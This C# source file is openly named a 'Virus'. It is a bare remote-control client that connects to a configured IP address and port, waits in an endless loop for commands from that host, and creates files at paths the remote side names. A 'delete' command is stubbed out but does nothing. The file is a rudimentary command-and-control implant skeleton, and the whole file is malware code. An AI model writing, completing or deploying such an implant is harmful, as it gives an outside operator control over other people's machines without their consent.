using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Net;
using System.IO;

namespace Virus
{
    class Program
    {
        static void Main(string[] args)
        {
            IPAddress address = IPAddress.Parse(Properties.Settings.Default.IP);
            int port = Properties.Settings.Default.Port;
            IPEndPoint endPoint = new IPEndPoint(address, port);
            Socket socket = new Socket(SocketType.Stream, ProtocolType.Tcp);
            socket.Connect(endPoint);
            byte[] buffer = new byte[8196];

            string request;
            while (true)
            {
                int bytesRecord = socket.Receive(buffer);
                request = Encoding.UTF8.GetString(buffer, 0, bytesRecord);
                string[] command = request.Split('|');
                switch (command[0])
                {
                    case "create":
                       FileStream stream =File.Create(command[1]);
                        stream.Close();
                        break;
                    case "delete":

                        break;
                    default:
                        break;
                }
            }
        }
    }
}
